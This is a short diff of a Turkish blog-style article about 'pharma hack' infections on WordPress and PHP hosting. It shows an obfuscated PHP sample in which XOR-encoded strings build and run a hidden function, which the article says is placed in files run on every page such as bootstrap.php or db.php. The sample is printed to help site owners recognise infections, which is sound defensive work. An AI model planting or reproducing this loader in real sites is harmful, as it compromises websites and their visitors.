@@ -35,15 +35,15 @@ Benim gördüğüm örnekleri popüler php hostinglerde ya sunucu kontrolünü e
 
 Örnek bir pharma hack kodu göstermem gerekirse:
 ```
-$check\_tmg\_password\_reset\_key = 'QN9Mrh7F=4?C!N^NP.NJ16YH6K66G=+BOeHeQ7D?A!"
-CMD$JT,UTP@#3kSZ=j8;>?=B5$(v+}k~)tKkwz6puT|\_P{-\[11):V;Hblc<eyfau+Z4r29\[dID2ThIY.E^A|AHcN@E-
+$check_tmg_password_reset_key = 'QN9Mrh7F=4?C!N^NP.NJ16YH6K66G=+BOeHeQ7D?A!"
+CMD$JT,UTP@#3kSZ=j8;>?=B5$(v+}k~)tKkwz6puT|_P{-[11):V;Hblc<eyfau+Z4r29[dID2ThIY.E^A|AHcN@E-
 woZPd'^'48X!Z(P<TZY/@:;f6G"/nQ<<i(YX3XE6<MjJ9X)ZnLD:7kE.9E;z=&ZIE05PEHZ
-PZQmyMJY{5;\*h8d;?\*b19{,7 Tl/EC@X#O-M<+l18\*N\[X,Z\]FT+K96\]$E+8\] 
-q##t{R\`0+JUFsy\_';
-$make\_ao\_site\_theme\_from\_oldschool = '"\`E\`\`e\_Fe$"dai.'|'Are!t!Y tncT)oF';
+PZQmyMJY{5;*h8d;?*b19{,7 Tl/EC@X#O-M<+l18*N[X,Z]FT+K96]$E+8] 
+q##t{R\`0+JUFsy_';
+$make_ao_site_theme_from_oldschool = '"\`E\`\`e_Fe$"dai.'|'Are!t!Y tncT)oF';
 
-$wp\_rzc\_newPage = $make\_ao\_site\_theme\_from\_oldschool('',$check\_tmg\_password\_reset\_key);
-$wp\_rzc\_newPage();
+$wp_rzc_newPage = $make_ao_site_theme_from_oldschool('',$check_tmg_password_reset_key);
+$wp_rzc_newPage();
 
 ```
 Bu kod wordpress bloglar için özellikle yazılmış bir pharma hack kodu. Genelde sitenizde her sayfada çalıştırılan bir dosyada yer alırlar. (bootstrap.php, common.php, db.php vs...)
